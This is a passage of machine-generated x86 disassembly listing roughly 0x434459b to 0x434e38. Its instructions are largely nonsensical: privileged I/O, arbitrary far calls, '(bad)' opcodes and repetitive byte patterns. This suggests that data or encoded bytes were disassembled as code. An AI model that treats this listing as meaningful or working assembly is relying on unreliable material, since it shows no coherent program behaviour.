  43459b:	xchg   ebx,eax
  43459c:	repnz popa 
  43459e:	or     eax,0x6fd655cd
  4345a3:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4345a9:	pop    esi
  4345aa:	call   0xf2d6a757
  4345af:	push   edi
  4345b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4345b1:	pop    ds
  4345b2:	out    0x3a,eax
  4345b4:	scas   eax,DWORD PTR es:[edi]
  4345b5:	sbb    al,0xf0
  4345b7:	ins    BYTE PTR es:[edi],dx
  4345b8:	xchg   ecx,eax
  4345b9:	popa   
  4345ba:	popa   
  4345bb:	or     eax,0xb85b175
  4345c0:	call   0xa8e8:0x5e343ac9
  4345c7:	popa   
  4345c8:	pop    ss
  4345c9:	jne    0x434607
  4345cb:	or     eax,0xb85b175
  4345d0:	call   0xa8e8:0x5e343ac9
  4345d7:	popa   
  4345d8:	pop    ss
  4345d9:	jne    0x434623
  4345db:	or     eax,0xcd0d9a75
  4345e0:	call   0x4ccd:0x1796da56
  4345e7:	or     eax,0xa20d4c75
  4345ec:	rcl    BYTE PTR [edi],cl
  4345ee:	jne    0x434638
  4345f0:	fsubr  st,st(2)
  4345f2:	dec    eax
  4345f3:	popa   
  4345f4:	mov    dl,0x3a
  4345f6:	scas   eax,DWORD PTR es:[edi]
  4345f7:	sbb    al,0xf0
  4345f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4345fa:	xchg   ecx,eax
  4345fb:	popa   
  4345fc:	popa   
  4345fd:	and    DWORD PTR [ebp+0x58],esi
  434600:	lods   eax,DWORD PTR ds:[esi]
  434601:	loop   0x434613
  434603:	imul   edx,DWORD PTR [ebx],0x75175875
  434609:	and    al,0xd
  43460b:	jne    0x434665
  43460d:	test   DWORD PTR [ebx],ecx
  43460f:	call   0xa8e8:0x5e343ac9
  434616:	popa   
  434617:	or     eax,0x681724cd
  43461c:	or     eax,0xb85b175
  434621:	call   0xa8e8:0x5e343ac9
  434628:	popa   
  434629:	pop    ss
  43462a:	jne    0x434644
  43462c:	or     eax,0xdb0d2075
  434631:	or     al,0x68
  434633:	popa   
  434634:	popa   
  434635:	or     eax,0x170d20cd
  43463a:	or     al,0x68
  43463c:	popa   
  43463d:	popa   
  43463e:	or     eax,0x56610d91
  434643:	cdq    
  434644:	xchg   esi,eax
  434645:	pop    ss
  434646:	jne    0x4346a8
  434648:	or     eax,0xf2936075
  43464d:	mov    ds:0x60cd0d7e,al
  434652:	adc    ebp,DWORD PTR [eax+ebp*2]
  434655:	mov    dl,BYTE PTR [edi]
  434657:	jne    0x4346c2
  434659:	or     eax,0xb85b175
  43465e:	call   0xa8e8:0x5e343ac9
  434665:	popa   
  434666:	pop    ss
  434667:	jne    0x4346cd
  434669:	or     eax,0xdb0d2075
  43466e:	adc    BYTE PTR [eax+0x61],ch
  434671:	popa   
  434672:	or     eax,0x18751761
  434677:	or     eax,0xdb0d2075
  43467c:	adc    BYTE PTR [eax+0x61],ch
  43467f:	popa   
  434680:	or     eax,0x9aa718cd
  434685:	mov    dl,0x9f
  434687:	adc    esi,DWORD PTR [ebp+0x28]
  43468a:	ror    BYTE PTR ds:0xb855d75,cl
  434690:	call   0xa8e8:0x5e343ac9
  434697:	popa   
  434698:	ror    BYTE PTR ds:0xeb626075,cl
  43469e:	shl    BYTE PTR [edx-0x4e],cl
  4346a1:	sbb    BYTE PTR ds:0xdb0d2075,cl
  4346a7:	dec    eax
  4346a8:	push   0xd2626161
  4346ad:	jbe    0x4346bc
  4346af:	jne    0x434711
  4346b1:	or     eax,0xa20d60cd
  4346b6:	shr    BYTE PTR ds:0xdd2be99,cl
  4346bc:	jne    0x43471e
  4346be:	or     eax,0xda5618cd
  4346c3:	mov    esi,0x934bf3c9
  4346c8:	popa   
  4346c9:	popa   
  4346ca:	or     eax,0xdb0d2075
  4346cf:	jmp    0xda4a83c
  4346d4:	int    0x18
  4346d6:	pop    ss
  4346d7:	call   0xbeeb:0x624c750d
  4346de:	bound  esi,QWORD PTR [edx+0x18b2629a]
  4346e4:	repz fisttp QWORD PTR [ecx+eiz*2+0x18750d61]
  4346ec:	or     eax,0xda5618cd
  4346f1:	xchg   esi,eax
  4346f2:	pop    ss
  4346f3:	int    0x4c
  4346f5:	or     eax,0xf2934c75
  4346fa:	mov    ds:0x4ccd0d7e,al
  4346ff:	adc    ebp,DWORD PTR [eax+ebp*2]
  434702:	mov    dl,BYTE PTR [edi]
  434704:	jne    0x434737
  434706:	or     eax,0xf2934c75
  43470b:	mov    ds:0xb1cd0d3b,al
  434710:	(bad)  
  434711:	outs   dx,DWORD PTR ds:[esi]
  434712:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  434718:	pop    esi
  434719:	call   0x1feaa8c6
  43471e:	xchg   ebx,eax
  43471f:	outs   dx,BYTE PTR ds:[esi]
  434720:	cmp    al,0x61
  434722:	popa   
  434723:	popa   
  434724:	or     eax,0xb85b175
  434729:	call   0xa8e8:0x5e343ac9
  434730:	popa   
  434731:	pop    ss
  434732:	jne    0x434735
  434734:	out    dx,al
  434735:	jl     0x434744
  434737:	jne    0x434736
  434739:	test   DWORD PTR [ebx],ecx
  43473b:	call   0x1301:0xcd0d3ac9
  434742:	outs   dx,BYTE PTR ds:[esi]
  434743:	push   0x61a8e85e
  434748:	pop    ss
  434749:	jne    0x43474c
  43474b:	or     eax,0x1cd83175
  434750:	cmp    BYTE PTR [edi],dl
  434752:	jne    0x434785
  434754:	or     eax,0xf2934c75
  434759:	mov    ds:0xfdcd0d3b,al
  43475e:	(bad)  
  43475f:	outs   dx,DWORD PTR ds:[esi]
  434760:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  434766:	pop    esi
  434767:	call   0x1f70a914
  43476c:	mov    eax,ds:0xb4930175
  434771:	or     eax,0xd616161
  434776:	jne    0x4347c4
  434778:	or     eax,0xddaaaa2
  43477d:	int    0x31
  43477f:	jg     0x43471a
  434781:	call   0xd4c:0x750d7de7
  434788:	mov    ds:0x584adaaa,al
  43478d:	or     eax,0x997f31cd
  434792:	call   0xaa99:0x564ccd0d
  434799:	pop    ss
  43479a:	loop   0x434722
  43479c:	arpl   WORD PTR [edx+0x62],sp
  43479f:	out    dx,al
  4347a0:	xchg   BYTE PTR ds:0xa20d3175,cl
  4347a6:	call   0x6262:0x6386e217
  4347ad:	bound  ecx,QWORD PTR [ebx]
  4347af:	xchg   BYTE PTR [ebx+0x62],ah
  4347b2:	bound  ecx,QWORD PTR ds:0xcd0d3175
  4347b8:	sbb    BYTE PTR [esi-0x26],dl
  4347bb:	xchg   cl,cl
  4347bd:	repz arpl WORD PTR [ecx+eiz*2-0x4e8af29f],cx
  4347c5:	test   DWORD PTR [ebx],ecx
  4347c7:	call   0xa8e8:0x5e343ac9
  4347ce:	popa   
  4347cf:	or     eax,0x99a131cd
  4347d4:	xchg   edx,eax
  4347d5:	mov    dl,0x34
  4347d7:	lock shl BYTE PTR [edx+0x62],0x62
  4347dc:	or     eax,0xeb623175
  4347e1:	xchg   edx,eax
  4347e2:	or     eax,0xcd0d3175
  4347e7:	call   0x750d:0xc97eda56
  4347ee:	xor    DWORD PTR ds:0xda5618cd,ecx
  4347f4:	xchg   cl,cl
  4347f6:	repz out 0x8d,al
  4347f9:	popa   
  4347fa:	popa   
  4347fb:	lock test BYTE PTR [edx+0x62],ah
  4347ff:	bound  ecx,QWORD PTR ds:0xdb0d2075
  434805:	adc    BYTE PTR [eax+0x61],ch
  434808:	popa   
  434809:	or     eax,0x9aa718cd
  43480e:	mov    dl,0x85
  434810:	adc    esi,DWORD PTR [ebp+0x28]
  434813:	ror    BYTE PTR ds:0xb85ad75,cl
  434819:	call   0xa8e8:0x5e343ac9
  434820:	popa   
  434821:	ror    BYTE PTR ds:0xeb626075,cl
  434827:	mov    esi,0xd18b262
  43482c:	jne    0x43484e
  43482e:	or     eax,0x616848db
  434833:	popa   
  434834:	(bad)
  434839:	mov    dl,0x90
  43483b:	lock cmp al,0x3b
  43483e:	popa   
  43483f:	popa   
  434840:	lock push ecx
  434842:	cmp    esp,DWORD PTR [ecx+0x61]
  434845:	or     eax,0xdb0d2075
  43484a:	pusha  
  43484b:	push   0x610d6161
  434850:	test   DWORD PTR [ebx],ecx
  434852:	call   0xa8e8:0x5e343ac9
  434859:	popa   
  43485a:	xchg   ebx,eax
  43485b:	outs   dx,BYTE PTR ds:[esi]
  43485c:	gs pop edi
  43485e:	popa   
  43485f:	popa   
  434860:	adc    esp,edx
  434862:	imul   esp,DWORD PTR [ebx+0x62],0x55e21762
  434869:	arpl   WORD PTR [edx+0x62],sp
  43486c:	or     eax,0xb85b175
  434871:	call   0xa8e8:0x5e343ac9
  434878:	popa   
  434879:	or     eax,0x62635513
  43487e:	bound  edx,QWORD PTR [edi]
  434880:	push   0x629ae221
  434885:	bound  esp,QWORD PTR [edx-0x1]
  434888:	loop   0x43488b
  43488a:	imul   esp,DWORD PTR [ecx],0x626286e2
  434890:	bound  ecx,QWORD PTR [edx+eiz*8+0x1]
  434894:	imul   esp,DWORD PTR [ecx],0x626292e2
  43489a:	bound  edi,QWORD PTR [edx+eiz*8]
  43489d:	add    DWORD PTR [ecx+0x21],ebp
  4348a0:	loop   0x434920
  4348a2:	bound  esp,QWORD PTR [edx+0x62]
  4348a5:	stc    
  4348a6:	loop   0x4348a9
  4348a8:	imul   esp,DWORD PTR [ecx],0x62628ae2
  4348ae:	(bad)  
  4348af:	stc    
  4348b0:	loop   0x4348b3
  4348b2:	imul   esp,DWORD PTR [ecx],0x626276e2
  4348b8:	bound  ebp,QWORD PTR [ebp-0x2796fe1e]
  4348be:	pop    ebx
  4348bf:	dec    eax
  4348c0:	arpl   WORD PTR [edx+0x62],sp
  4348c3:	popa   
  4348c4:	out    dx,al
  4348c5:	lea    ecx,ds:0x626348e2
  4348cb:	bound  esp,QWORD PTR [edx+0x6348e217]
  4348d1:	bound  esp,QWORD PTR [edx-0x28]
  4348d4:	and    ecx,DWORD PTR [eax+0x63]
  4348d7:	bound  esp,QWORD PTR [edx+0x3b]
  4348da:	jae    0x4348de
  4348dc:	or     eax,0x626348e2
  4348e1:	bound  ecx,QWORD PTR ds:0x629ae26e
  4348e7:	bound  esp,QWORD PTR [edx-0x7b]
  4348ea:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  4348f0:	call   0x1350aa9d
  4348f5:	dec    eax
  4348f6:	arpl   WORD PTR [edx+0x62],sp
  4348f9:	xchg   esp,eax
  4348fa:	pop    ss
  4348fb:	outs   dx,BYTE PTR ds:[esi]
  4348fc:	int    0x64
  4348fe:	arpl   WORD PTR [edx+0x62],sp
  434901:	out    dx,al
  434902:	adc    eax,0x62fbe221
  434907:	bound  esp,QWORD PTR [edx+0x18]
  43490a:	loop   0x43490d
  43490c:	imul   esp,DWORD PTR [ecx],0x62628ee2
  434912:	bound  edi,QWORD PTR [edx+eiz*8]
  434915:	add    DWORD PTR [ecx+0x21],ebp
  434918:	loop   0x434952
  43491a:	bound  esp,QWORD PTR [edx+0x62]
  43491d:	and    ah,dl
  43491f:	add    DWORD PTR [ecx+0x21],ebp
  434922:	loop   0x4348ca
  434924:	bound  esp,QWORD PTR [edx+0x62]
  434927:	arpl   dx,sp
  434929:	add    DWORD PTR [ecx+0x21],ebp
  43492c:	loop   0x4349a0
  43492e:	bound  esp,QWORD PTR [edx+0x62]
  434931:	cmp    eax,0x216901e2
  434936:	loop   0x4348d6
  434938:	bound  esp,QWORD PTR [edx+0x62]
  43493b:	jmp    edx
  43493d:	add    DWORD PTR [ecx+0x21],ebp
  434940:	loop   0x4348ec
  434942:	bound  esp,QWORD PTR [edx+0x62]
  434945:	cmp    al,0xe2
  434947:	add    DWORD PTR [ecx+0x21],ebp
  43494a:	loop   0x4348e2
  43494c:	bound  esp,QWORD PTR [edx+0x62]
  43494f:	(bad)  
  434951:	add    DWORD PTR [ecx+0x21],ebp
  434954:	loop   0x4348f8
  434956:	bound  esp,QWORD PTR [edx+0x62]
  434959:	jmp    edx
  43495b:	add    DWORD PTR [ecx+0x21],ebp
  43495e:	loop   0x43498c
  434960:	bound  esp,QWORD PTR [edx+0x62]
  434963:	dec    esp
  434964:	loop   0x434967
  434966:	imul   esp,DWORD PTR [ecx],0x6262dae2
  43496c:	bound  esp,QWORD PTR [edx]
  43496e:	loop   0x434971
  434970:	imul   esp,DWORD PTR [ecx],0x6262c6e2
  434976:	bound  ecx,QWORD PTR [ebp-0x1e]
  434979:	add    DWORD PTR [ecx+0x21],ebp
  43497c:	loop   0x434950
  43497e:	bound  esp,QWORD PTR [edx+0x62]
  434981:	arpl   dx,sp
  434983:	add    DWORD PTR [ecx+0x21],ebp
  434986:	loop   0x434946
  434988:	bound  esp,QWORD PTR [edx+0x62]
  43498b:	pop    ds
  43498c:	loop   0x43498f
  43498e:	imul   esp,DWORD PTR [ecx],0x6262cae2
  434994:	bound  esp,QWORD PTR [edx]
  434996:	loop   0x434999
  434998:	imul   esp,DWORD PTR [ecx],0x6262b6e2
  43499e:	bound  esp,QWORD PTR [ebp-0x1e]
  4349a1:	add    DWORD PTR [ecx+0x21],ebp
  4349a4:	loop   0x4349e6
  4349a6:	bound  esp,QWORD PTR [edx+0x62]
  4349a9:	cmp    al,0xe2
  4349ab:	add    DWORD PTR [ecx+0x21],ebp
  4349ae:	loop   0x43497e
  4349b0:	bound  esp,QWORD PTR [edx+0x62]
  4349b3:	cmp    al,0xe2
  4349b5:	add    DWORD PTR [ecx+0x21],ebp
  4349b8:	loop   0x434a34
  4349ba:	bound  esp,QWORD PTR [edx+0x62]
  4349bd:	and    ah,dl
  4349bf:	add    DWORD PTR [ecx+0x21],ebp
  4349c2:	loop   0x4349aa
  4349c4:	bound  esp,QWORD PTR [edx+0x62]
  4349c7:	dec    ecx
  4349c8:	loop   0x4349cb
  4349ca:	imul   esp,DWORD PTR [ecx],0x6262ebe2
  4349d0:	bound  edx,QWORD PTR [ebx-0x1e]
  4349d3:	add    DWORD PTR [ecx+0x21],ebp
  4349d6:	loop   0x4349bf
  4349d8:	bound  esp,QWORD PTR [edx+0x62]
  4349db:	push   ebx
  4349dc:	loop   0x4349df
  4349de:	imul   esp,DWORD PTR [ecx],0x6262e3e2
  4349e4:	bound  ebp,QWORD PTR [ebp-0x2796fe1e]
  4349ea:	pop    ebx
  4349eb:	cmp    al,0x63
  4349ed:	bound  esp,QWORD PTR [edx+0x61]
  4349f0:	out    dx,al
  4349f1:	lea    ecx,ds:0x62633ce2
  4349f7:	bound  esp,QWORD PTR [edx+0x633ce217]
  4349fd:	bound  esp,QWORD PTR [edx-0x28]
  434a00:	and    edi,DWORD PTR [ebx+eiz*2]
  434a03:	bound  esp,QWORD PTR [edx-0x75]
  434a06:	jae    0x434a87
  434a08:	or     eax,0x62633ce2
  434a0d:	bound  ecx,QWORD PTR ds:0x62fbe26e
  434a13:	bound  esp,QWORD PTR [edx-0x7b]
  434a16:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  434a1c:	call   0x1350abc9
  434a21:	cmp    al,0x63
  434a23:	bound  esp,QWORD PTR [edx+0x4]
  434a26:	sub    al,0x8d
  434a28:	fucomi st,st(6)
  434a2a:	and    DWORD PTR [ebx],edx
  434a2c:	loop   0x434a92
  434a2e:	arpl   WORD PTR [edx+0x62],sp
  434a31:	ror    BYTE PTR ds:0xdb0d2075,cl
  434a37:	dec    eax
  434a38:	push   0xd2626161
  434a3d:	not    DWORD PTR [edi]
  434a3f:	loop   0x434aa2
  434a41:	bound  esp,QWORD PTR [edx+0x62]
  434a44:	adc    esi,DWORD PTR [ebp-0xb]
  434a47:	pop    ss
  434a48:	loop   0x434a41
  434a4a:	bound  esp,QWORD PTR [edx+0x62]
  434a4d:	adc    esi,DWORD PTR [ebp-0x25]
  434a50:	shl    BYTE PTR [edx+0xb],cl
  434a53:	popa   
  434a54:	bound  esp,QWORD PTR [edx+0x62]
  434a57:	or     eax,0xdb0d2075
  434a5c:	dec    eax
  434a5d:	push   0xd2626161
  434a62:	call   0x6262:0x62f7130d
  434a69:	pop    ss
  434a6a:	push   0x6369e213
  434a6f:	bound  esp,QWORD PTR [edx-0x2e]
  434a72:	or     eax,0xdb0d2075
  434a77:	adc    BYTE PTR [eax+0x61],ch
  434a7a:	popa   
  434a7b:	bound  esi,QWORD PTR [edx+0xd]
  434a7e:	jne    0x434a75
  434a80:	bound  ebx,QWORD PTR [eax+0x13]
  434a83:	loop   0x434a9d
  434a85:	arpl   WORD PTR [edx+0x62],sp
  434a88:	pop    ss
  434a89:	loop   0x434a7e
  434a8b:	arpl   WORD PTR [edx+0x62],sp
  434a8e:	or     eax,0xb85b175
  434a93:	call   0xa8e8:0x5e343ac9
  434a9a:	popa   
  434a9b:	or     eax,0x6263f313
  434aa0:	bound  edx,QWORD PTR [edi]
  434aa2:	push   0x85b1750d
  434aa7:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  434aad:	call   0xe2e4ac5a
  434ab2:	imul   esp,DWORD PTR [ebx+0x62],0x116e9362
  434ab9:	popa   
  434aba:	popa   
  434abb:	popa   
  434abc:	adc    esp,edx
  434abe:	push   eax
  434abf:	arpl   WORD PTR [edx+0x62],sp
  434ac2:	pop    ss
  434ac3:	loop   0x434aed
  434ac5:	arpl   WORD PTR [edx+0x62],sp
  434ac8:	or     eax,0x626328e2
  434acd:	bound  ecx,QWORD PTR ds:0x62636913
  434ad3:	bound  edx,QWORD PTR [edi]
  434ad5:	call   0x10db:0xd20750d
  434adc:	push   0x130d6161
  434ae1:	imul   esp,DWORD PTR [ebx+0x62],0x8ad10d62
  434ae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434ae9:	call   0x6355:0xe20d78e7
  434af0:	bound  esp,QWORD PTR [edx+0xd]
  434af3:	adc    ebp,DWORD PTR [ecx+0x63]
  434af6:	bound  esp,QWORD PTR [edx+0xd]
  434af9:	xchg   ecx,eax
  434afa:	pop    ss
  434afb:	call   0x6262:0x6350e20d
  434b02:	mov    eax,ds:0x626369e2
  434b07:	bound  esi,QWORD PTR [edx-0x11a011a1]
  434b0d:	pusha  
  434b0e:	or     eax,0xdb0d2075
  434b13:	adc    BYTE PTR [eax+0x61],ch
  434b16:	popa   
  434b17:	or     eax,0x62636913
  434b1c:	bound  ecx,QWORD PTR ds:0x9aa78ad1
  434b22:	mov    dl,0x39
  434b24:	or     eax,0xdb0d2075
  434b29:	or     al,0x68
  434b2b:	popa   
  434b2c:	popa   
  434b2d:	or     eax,0x60cd0d61
  434b32:	push   esi
  434b33:	cdq    
  434b34:	cmp    BYTE PTR ds:0x62636913,cl
  434b3a:	bound  edx,QWORD PTR [edi]
  434b3c:	cdq    
  434b3d:	jbe    0x434b4c
  434b3f:	jne    0x434b3e
  434b41:	test   DWORD PTR [ebx],ecx
  434b43:	call   0xa8e8:0x5e343ac9
  434b4a:	popa   
  434b4b:	or     eax,0x6263f313
  434b50:	bound  edx,QWORD PTR [edi]
  434b52:	push   0x6e931caf
  434b57:	or     al,0x5f
  434b59:	popa   
  434b5a:	popa   
  434b5b:	fcomp  DWORD PTR [ebx-0x56]
  434b5e:	arpl   WORD PTR [edx+0x62],sp
  434b61:	popa   
  434b62:	and    edx,esp
  434b64:	mov    ds:0xff626263,al
  434b69:	loop   0x434b6c
  434b6b:	imul   esp,DWORD PTR [ecx],0x62632ce2
  434b71:	bound  ecx,QWORD PTR [edx+eiz*8+0x1]
  434b75:	imul   esp,DWORD PTR [ecx],0x6263dae2
  434b7b:	bound  edi,QWORD PTR [edx+eiz*8]
  434b7e:	add    DWORD PTR [ecx+0x21],ebp
  434b81:	loop   0x434b49
  434b83:	arpl   WORD PTR [edx+0x62],sp
  434b86:	stc    
  434b87:	loop   0x434b8a
  434b89:	imul   esp,DWORD PTR [ecx],0x6263d2e2
  434b8f:	(bad)  
  434b90:	stc    
  434b91:	loop   0x434b94
  434b93:	imul   esp,DWORD PTR [ecx],0x6263bee2
  434b99:	bound  ebp,QWORD PTR [ebp-0x2796fe1e]
  434b9f:	pop    ebx
  434ba0:	mov    fs,WORD PTR [ebx+0x62]
  434ba3:	bound  esp,QWORD PTR [ecx-0x12]
  434ba6:	lea    ecx,ds:0x62638ee2
  434bac:	bound  esp,QWORD PTR [edx+0x638ee217]
  434bb2:	bound  esp,QWORD PTR [edx-0x28]
  434bb5:	and    ecx,DWORD PTR [esi+0x3b626263]
  434bbb:	jae    0x434bbf
  434bbd:	or     eax,0x62638ee2
  434bc2:	bound  ecx,QWORD PTR ds:0x63a2e26e
  434bc8:	bound  esp,QWORD PTR [edx-0x7b]
  434bcb:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  434bd1:	call   0x1350ad7e
  434bd6:	mov    fs,WORD PTR [ebx+0x62]
  434bd9:	bound  edx,QWORD PTR [edi+edx*1+0x63a6cd6e]
  434be0:	bound  esp,QWORD PTR [edx-0x12]
  434be3:	adc    eax,0x63cae221
  434be8:	bound  esp,QWORD PTR [edx+0x18]
  434beb:	loop   0x434bee
  434bed:	imul   esp,DWORD PTR [ecx],0x6263b6e2
  434bf3:	bound  edi,QWORD PTR [edx+eiz*8]
  434bf6:	add    DWORD PTR [ecx+0x21],ebp
  434bf9:	loop   0x434c3b
  434bfb:	arpl   WORD PTR [edx+0x62],sp
  434bfe:	and    ah,dl
  434c00:	add    DWORD PTR [ecx+0x21],ebp
  434c03:	loop   0x434bd3
  434c05:	arpl   WORD PTR [edx+0x62],sp
  434c08:	arpl   dx,sp
  434c0a:	add    DWORD PTR [ecx+0x21],ebp
  434c0d:	loop   0x434c89
  434c0f:	arpl   WORD PTR [edx+0x62],sp
  434c12:	cmp    eax,0x216901e2
  434c17:	loop   0x434bff
  434c19:	arpl   WORD PTR [edx+0x62],sp
  434c1c:	jmp    edx
  434c1e:	add    DWORD PTR [ecx+0x21],ebp
  434c21:	loop   0x434c0e
  434c23:	arpl   WORD PTR [edx+0x62],sp
  434c26:	cmp    al,0xe2
  434c28:	add    DWORD PTR [ecx+0x21],ebp
  434c2b:	loop   0x434c14
  434c2d:	arpl   WORD PTR [edx+0x62],sp
  434c30:	(bad)  
  434c32:	add    DWORD PTR [ecx+0x21],ebp
  434c35:	loop   0x434c1a
  434c37:	arpl   WORD PTR [edx+0x62],sp
  434c3a:	jmp    edx
  434c3c:	add    DWORD PTR [ecx+0x21],ebp
  434c3f:	loop   0x434c20
  434c41:	arpl   WORD PTR [edx+0x62],sp
  434c44:	dec    esp
  434c45:	loop   0x434c48
  434c47:	imul   esp,DWORD PTR [ecx],0x6263dbe2
  434c4d:	bound  esp,QWORD PTR [edx]
  434c4f:	loop   0x434c52
  434c51:	imul   esp,DWORD PTR [ecx],0x62636ee2
  434c57:	bound  ecx,QWORD PTR [ebp-0x1e]
  434c5a:	add    DWORD PTR [ecx+0x21],ebp
  434c5d:	loop   0x434c63
  434c5f:	arpl   WORD PTR [edx+0x62],sp
  434c62:	arpl   dx,sp
  434c64:	add    DWORD PTR [ecx+0x21],ebp
  434c67:	loop   0x434c79
  434c69:	arpl   WORD PTR [edx+0x62],sp
  434c6c:	pop    ds
  434c6d:	loop   0x434c70
  434c6f:	imul   esp,DWORD PTR [ecx],0x62630ce2
  434c75:	bound  esp,QWORD PTR [edx]
  434c77:	loop   0x434c7a
  434c79:	imul   esp,DWORD PTR [ecx],0x6263e9e2
  434c7f:	bound  esp,QWORD PTR [ebp-0x1e]
  434c82:	add    DWORD PTR [ecx+0x21],ebp
  434c85:	loop   0x434c7c
  434c87:	arpl   WORD PTR [edx+0x62],sp
  434c8a:	cmp    al,0xe2
  434c8c:	add    DWORD PTR [ecx+0x21],ebp
  434c8f:	loop   0x434c92
  434c91:	arpl   WORD PTR [edx+0x62],sp
  434c94:	cmp    al,0xe2
  434c96:	add    DWORD PTR [ecx+0x21],ebp
  434c99:	loop   0x434c98
  434c9b:	arpl   WORD PTR [edx+0x62],sp
  434c9e:	and    ah,dl
  434ca0:	add    DWORD PTR [ecx+0x21],ebp
  434ca3:	loop   0x434cf9
  434ca5:	arpl   WORD PTR [edx+0x62],sp
  434ca8:	dec    ecx
  434ca9:	loop   0x434cac
  434cab:	imul   esp,DWORD PTR [ecx],0x626324e2
  434cb1:	bound  edx,QWORD PTR [ebx-0x1e]
  434cb4:	add    DWORD PTR [ecx+0x21],ebp
  434cb7:	loop   0x434c6a
  434cb9:	arpl   WORD PTR [edx+0x62],sp
  434cbc:	push   ebx
  434cbd:	loop   0x434cc0
  434cbf:	imul   esp,DWORD PTR [ecx],0x6263ade2
  434cc5:	bound  ebp,QWORD PTR [ebp-0x2796fe1e]
  434ccb:	pop    ebx
  434ccc:	sti    
  434ccd:	arpl   WORD PTR [edx+0x62],sp
  434cd0:	popa   
  434cd1:	out    dx,al
  434cd2:	lea    ecx,ds:0x6263fbe2
  434cd8:	bound  esp,QWORD PTR [edx+0x63fbe217]
  434cde:	bound  esp,QWORD PTR [edx-0x28]
  434ce1:	and    edi,ebx
  434ce3:	arpl   WORD PTR [edx+0x62],sp
  434ce6:	mov    esi,DWORD PTR [ebx-0x2c]
  434ce9:	or     eax,0x6263fbe2
  434cee:	bound  ecx,QWORD PTR ds:0x63cae26e
  434cf4:	bound  esp,QWORD PTR [edx-0x7b]
  434cf7:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  434cfd:	call   0x1350aeaa
  434d02:	sti    
  434d03:	arpl   WORD PTR [edx+0x62],sp
  434d06:	add    al,0x6e
  434d08:	lea    edx,[ebx+eiz*2]
  434d0b:	bound  esp,QWORD PTR [edx-0x12]
  434d0e:	stc    
  434d0f:	adc    esp,edx
  434d11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434d12:	arpl   WORD PTR [edx+0x62],sp
  434d15:	ror    BYTE PTR ds:0xdb0d2075,cl
  434d1b:	dec    eax
  434d1c:	push   0xd2626161
  434d21:	not    DWORD PTR [edi]
  434d23:	loop   0x434cbb
  434d25:	arpl   WORD PTR [edx+0x62],sp
  434d28:	adc    esp,edx
  434d2a:	adc    al,0x63
  434d2c:	bound  esp,QWORD PTR [edx-0x2e]
  434d2f:	bound  ecx,QWORD PTR [ebx]
  434d31:	xchg   esi,eax
  434d32:	arpl   WORD PTR [edx+0x62],sp
  434d35:	or     eax,0xdb0d2075
  434d3a:	dec    eax
  434d3b:	push   0xd2626161
  434d40:	call   0x6262:0x6358e217
  434d47:	adc    esp,edx
  434d49:	stos   BYTE PTR es:[edi],al
  434d4a:	arpl   WORD PTR [edx+0x62],sp
  434d4d:	ror    BYTE PTR ds:0xdb0d2075,cl
  434d53:	adc    BYTE PTR [eax+0x61],ch
  434d56:	popa   
  434d57:	bound  esi,QWORD PTR [edx+0x62]
  434d5a:	in     al,0x58
  434d5c:	arpl   WORD PTR [edx+0x62],sp
  434d5f:	fcomp  DWORD PTR [ebx+0x38]
  434d62:	arpl   WORD PTR [edx+0x62],sp
  434d65:	popa   
  434d66:	fsub   DWORD PTR [ebx]
  434d68:	stos   BYTE PTR es:[edi],al
  434d69:	arpl   WORD PTR [edx+0x62],sp
  434d6c:	popa   
  434d6d:	out    0xdf,eax
  434d6f:	or     eax,0x6263aae2
  434d74:	bound  edx,QWORD PTR [edi]
  434d76:	loop   0x434dee
  434d78:	arpl   WORD PTR [edx+0x62],sp
  434d7b:	or     eax,0xdb0d2075
  434d80:	adc    BYTE PTR [eax+0x61],ch
  434d83:	popa   
  434d84:	or     eax,0x6263aa13
  434d89:	bound  ecx,QWORD PTR ds:0x9aa78ad1
  434d8f:	out    0xfb,eax
  434d91:	or     eax,0x6263aae2
  434d96:	bound  ecx,QWORD PTR ds:0xaae21761
  434d9c:	arpl   WORD PTR [edx+0x62],sp
  434d9f:	or     eax,0x6263aae2
  434da4:	bound  esp,QWORD PTR [edi+0x626376e2]
  434daa:	bound  esi,QWORD PTR [edx-0x11a011a1]
  434db0:	dec    esi
  434db1:	or     eax,0xdb0d2075
  434db6:	adc    BYTE PTR [eax+0x61],ch
  434db9:	popa   
  434dba:	or     eax,0x6263aa13
  434dbf:	bound  ecx,QWORD PTR ds:0x9aa78ad1
  434dc5:	mov    dl,0x8e
  434dc7:	or     eax,0xdb0d2075
  434dcc:	or     al,0x68
  434dce:	popa   
  434dcf:	popa   
  434dd0:	or     eax,0x60cd0d61
  434dd5:	push   esi
  434dd6:	cdq    
  434dd7:	cmp    BYTE PTR ds:0x6263aa13,cl
  434ddd:	bound  edx,QWORD PTR [edi]
  434ddf:	cdq    
  434de0:	jbe    0x434e03
  434de2:	loop   0x434e1c
  434de4:	arpl   WORD PTR [edx+0x62],sp
  434de7:	push   0x62616161
  434dec:	mov    dl,0x20
  434dee:	bound  esi,QWORD PTR [edx+0x18b2624c]
  434df4:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434df6:	xor    DWORD PTR [edx+0x62],esp
  434df9:	loop   0x434e17
  434dfb:	mov    dl,0x90
  434dfd:	lock sub BYTE PTR [eax+0x61],0x61
  434e02:	lock imul ebp,DWORD PTR [eax+0x61],0x61
  434e07:	bound  esi,QWORD PTR [edx+0x4cb26220]
  434e0d:	bound  esi,QWORD PTR [edx-0x12160ce8]
  434e13:	bound  esp,QWORD PTR [edx-0x1e]
  434e16:	sbb    al,0xb2
  434e18:	nop
  434e19:	lock arpl WORD PTR [ecx+0x61],sp
  434e1d:	popa   
  434e1e:	lock xor BYTE PTR [ecx+0x61],ah
  434e22:	popa   
  434e23:	bound  esi,QWORD PTR [edx+0x4cb26220]
  434e29:	bound  esi,QWORD PTR [edx+0x64d9f318]
  434e2f:	bound  esp,QWORD PTR [edx-0x1e]
  434e32:	sbb    al,0xb2
  434e34:	nop
  434e35:	lock ss popa 
  434e38:	popa   
